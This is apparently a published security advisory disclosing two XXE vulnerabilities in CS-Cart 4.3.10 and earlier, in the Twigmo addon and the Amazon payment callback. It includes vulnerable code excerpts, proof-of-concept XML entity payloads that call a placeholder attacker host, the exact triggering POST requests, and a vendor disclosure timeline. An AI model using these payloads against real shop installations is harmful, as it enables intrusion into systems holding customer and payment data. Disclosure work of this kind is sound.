@@ -1,0 +1,107 @@
+# Software : CS-Cart <= 4.3.10
+# Vendor home : cs-cart.com
+# Author : Ahmed Sultan (@0x4148)
+# Home : 0x4148.com
+# Email : 0x4148@gmail.com
+# Tested on : apache on windoes with php 5.4.4 / apache on linux with php <5.2.17
+
+From vendor site
+CS-Cart is an impressive platform for users to any level of eCommerce
+experience.
+With loads of features at a great price, CS-Cart is a great shopping cart
+solution that will quickly enable your online store to do business.
+
+XXE I : Twimgo addon
+app/addons/twigmo/Twigmo/Api/ApiData.php
+Line 131
+public static function parseDocument($data, $format =
+TWG_DEFAULT_DATA_FORMAT)
+{
+if ($format == 'xml') {
+$result = @simplexml_load_string($data, 'SimpleXMLElement',
+LIBXML_NOCDATA);
+return self::getObjectAsArray($result);
+} elseif ($format == 'jsonp') {
+return (array) json_decode($data, true);
+} elseif ($format == 'json') {
+return (array) json_decode($data, true);
+}
+
+return false;
+}
+POC
+<?php
+$xml="
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM 'http://YOUR_HOST/0x4148.jnk' >]>
+<document>
+<Author>Ahmed sultan (0x4148)</Author>
+<killit>&xxe;</killit>
+</document>
+";
+echo rawurlencode(base64_encode($xml));
+?>
+
+change YOUR_HOST to your server address , use the output in the following
+POST request
+Action -> HOST/cs-cart/index.php?dispatch=twigmo.post
+Data -> action=add_to_cart&data=DATA_OUT_PUT_HERE&format=xml
+a GET request will be sent to your webserver from the vulnerable host
+indicating successful attack
+(Require twimgo addon to be activated)
+
+XXE II : Amazon payment
+File : app/payments/amazon/amazon_callback.php
+Line 16
+use Tygh\Registry;
+
+if (!defined('BOOTSTRAP')) { die('Access denied'); }
+
+include_once (Registry::get('config.dir.payments') .
+'amazon/amazon_func.php');
+
+fn_define('AMAZON_ORDER_DATA', 'Z');
+
+if (!empty($_POST['order-calculations-request'])) {
+$xml_response = $_POST['order-calculations-request'];
+
+} elseif (!empty($_POST['NotificationData'])) {
+$xml_response = $_POST['NotificationData'];
+}
+
+if (!empty($_POST['order-calculations-error'])) {
+// Process the Amazon callback error
+$xml_error = $_POST['order-calculations-error'];
+$xml = @simplexml_load_string($xml_error);
+if (empty($xml)) {
+$xml = @simplexml_load_string(stripslashes($xml_error));
+}
+
+// Get error message
+$code = (string) $xml->OrderCalculationsErrorCode;
+$message = (string) $xml->OrderCalculationsErrorMessage;
+
+POC
+sending POST request to
+app/payments/amazon/amazon_checkout.php
+setting POST parameter order-calculations-request to
+<?xml version='1.0'?>
+<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://host/amazon.jnk" >]>
+<document>
+<Author>Ahmed sultan (0x4148)</Author>
+<killit>%26xxe%3b</killit>
+</document>
+
+Will result in an GET request to your host from the vulnerable machine ,
+indicating successful attack
+(Require amazon payment method to be activated)
+
+
+Disclosure time line
+10/11 vulnerabilities reported to the vendor
+11/11 Vendor asked for extra details
+12/11 Vendor acknowledged the validity of vulnerabilities and asked for
+time to fix
+16/11 vendor permitted public release
+
+Reference
+https://0x4148.com/2016/11/10/cs-cart/
